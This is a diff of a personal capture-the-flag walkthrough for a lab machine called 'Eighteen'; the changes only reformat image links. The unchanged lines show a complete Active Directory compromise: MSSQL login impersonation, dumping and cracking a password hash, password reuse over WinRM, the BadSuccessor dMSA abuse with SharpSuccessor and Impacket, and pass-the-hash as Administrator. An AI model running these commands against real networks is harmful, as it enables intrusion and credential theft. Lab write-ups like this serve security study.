@@ -76,15 +76,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
 |_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02
 ```
-![[Pasted image 20251208114057.png]]
+![Pasted image 20251208114057](../Attachments/Pasted20image%2020251208114057.png)
 
 - I can mssql into the target but cant execute many commands. I do find a database `financial_planner`
 - I create a new account on the website `test:test` and login:
-![[Pasted image 20251208114712.png]]
-![[Pasted image 20251208114728.png]]
+![Pasted image 20251208114712](../Attachments/Pasted20image%2020251208114712.png)
+![Pasted image 20251208114728](../Attachments/Pasted20image%2020251208114728.png)
 
 - Cant access admin dashboard with this account:
-![[Pasted image 20251208114759.png]]
+![Pasted image 20251208114759](../Attachments/Pasted20image%2020251208114759.png)
 
 - Going to mysql I can connect with the given credentials and these commands provide me the current user, the database names and the users in the mssql environment:
 ```
@@ -94,18 +94,18 @@ impacket-mssqlclient kevin@eighteen.htb
 
 > select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 ```
-![[Pasted image 20251208134122.png]]
+![Pasted image 20251208134122](../Attachments/Pasted20image%2020251208134122.png)
 - I can also list the databases:
 ```
 SELECT name FROM sys.databases;
 ```
-![[Pasted image 20251208134456.png]]
+![Pasted image 20251208134456](../Attachments/Pasted20image%2020251208134456.png)
 - However I don't have permissions to see `financial_planner`
 - I can pass the `exec_as_login` command to run as user `appdev`
 ```
 exec_as_login appdev
 ```
-![[Pasted image 20251208134310.png]]
+![Pasted image 20251208134310](../Attachments/Pasted20image%2020251208134310.png)
 
 - Using `appdev` I can access financial planner:
 ```
@@ -136,7 +136,7 @@ d   full_name   username   email                password_hash                   
 - I get the hash of user `admin`. 
 - This is an unusual hash. Looking online I find : https://hashcat.net/forum/thread-7854.html
 - I can create the right format by first passing the following command (i changed the hash format a bit to match the one in the link):
-```bash
+```
 echo '$pbkdf2-sha256$600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | gawk '{sub(/^.*-/,"")}$1=$1' FS=\$ OFS=:
 
 ---OUTPUT---
@@ -167,7 +167,7 @@ hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt -a 0 --force
 ---RELEVANT-OUTPUT---
 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
 ```
-![[Pasted image 20251208135741.png]]
+![Pasted image 20251208135741](../Attachments/Pasted20image%2020251208135741.png)
 
 - I can login to the website with `admin:iloveyou1` but there is nothing there.
 
@@ -189,10 +189,10 @@ MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
 ```
 evil-winrm -u 'adam.scott' -p 'iloveyou1' -i 10.10.11.95
 ```
-![[Pasted image 20251208135935.png]]
+![Pasted image 20251208135935](../Attachments/Pasted20image%2020251208135935.png)
 
 - I grab user flag:
-![[Pasted image 20251208135954.png]]
+![Pasted image 20251208135954](../Attachments/Pasted20image%2020251208135954.png)
 
 - If we check winpeas we see the windows build version is vulnerable dmsa vulnerability
 - Using rubeus and getST we could impersonate admin and get hash
@@ -226,7 +226,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in adam.scott.ccache
 ```
 
-![[Pasted image 20251209084644.png]]
+![Pasted image 20251209084644](../Attachments/Pasted%20image%2020251209084644.png)
 - Alternatively I can use the following command to generate a ticket with Rubeus:
 ```
 .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /enctype:aes256 /nowrap /outfile:scott.b64
@@ -244,7 +244,7 @@ impacket-ticketConverter scott.b64 scott.ccache
 # then export with the command from previous step
 ```
 - Before the next step I need to find a vulnerable OU path for it. This can be done with the ps1 executable I find that checks for BadSuccessor:https://github.com/akamai/BadSuccessor
-![[Pasted image 20251209125525.png]]
+![Pasted image 20251209125525](../Attachments/Pasted%20image%2020251209125525.png)
 - Then on the target, I generate the delegated service using SharpSuccessor:
 ```
 .\SharpSuccessor.exe add /impersonate:Administrator /path:”ou=Staff,DC=eighteen,dc=htb” /account:adam.scott /name:newdMSA
@@ -277,8 +277,8 @@ impacket-ticketConverter scott.b64 scott.ccache
 [+] msDS-SupersededServiceAccountState set to 2
 [!] Exception: Access is denied.
 ```
-![[Pasted image 20251209085056.png]]
-![[Pasted image 20251209085108.png]]
+![Pasted image 20251209085056](../Attachments/Pasted%20image%2020251209085056.png)
+![Pasted image 20251209085108](../Attachments/Pasted%20image%2020251209085108.png)
 - I can check if it's created with the command:
 ```
 Get-ADServiceAccount -Filter * | Select Name,SamAccountName
@@ -315,7 +315,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
 [*] Saving ticket in newdMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
 ```
-![[Pasted image 20251209084713.png]]
+![Pasted image 20251209084713](../Attachments/Pasted%20image%2020251209084713.png)
 - I change the ticket name to `newdMSA.ccache` just to avoid any errors when exporting and then export it to `KRB5CCNAME`
 ```
 mv newdMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache newdMSA.ccache
@@ -353,12 +353,12 @@ Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
 Administrator:0x17:0b133be956bfaddf9cea56701affddec
 [*] Cleaning up...
 ```
-![[Pasted image 20251209084541.png]]
+![Pasted image 20251209084541](../Attachments/Pasted%20image%2020251209084541.png)
 - Using this I can pass the hash and login using `evil-winrm` as `Administrator`
 ```
 evil-winrm -u 'Administrator' -H '0b133be956bfaddf9cea56701affddec' -i 10.10.11.95
 ```
-![[Pasted image 20251209084520.png]]
+![Pasted image 20251209084520](../Attachments/Pasted%20image%2020251209084520.png)
 
 - I grab the root flag:
-![[Pasted image 20251209084504.png]]
+![Pasted image 20251209084504](../Attachments/Pasted%20image%2020251209084504.png)
